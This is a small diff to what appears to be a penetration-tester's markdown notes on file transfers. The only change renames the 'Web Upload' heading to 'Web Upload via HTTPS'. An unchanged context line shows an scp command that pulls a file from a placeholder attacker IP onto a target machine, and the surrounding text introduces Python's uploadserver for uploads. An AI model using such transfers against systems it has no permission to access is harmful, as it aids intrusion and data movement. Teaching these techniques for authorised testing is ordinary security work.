@@ -79,7 +79,7 @@ scp <username>@<attacker_ip>:/root/myroot.txt . # on a target machine
 >You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer. 
 
 ## Upload Operations
-### Web Upload
+### Web Upload via HTTPS
 we can use uploadserver - extended module of the Python `HTTP.Server` module, which includes a file upload page. For this example let's configure the `uploadserver` module to use `HTTPS` for secure communication.
 ####  Download python module
 ```bash
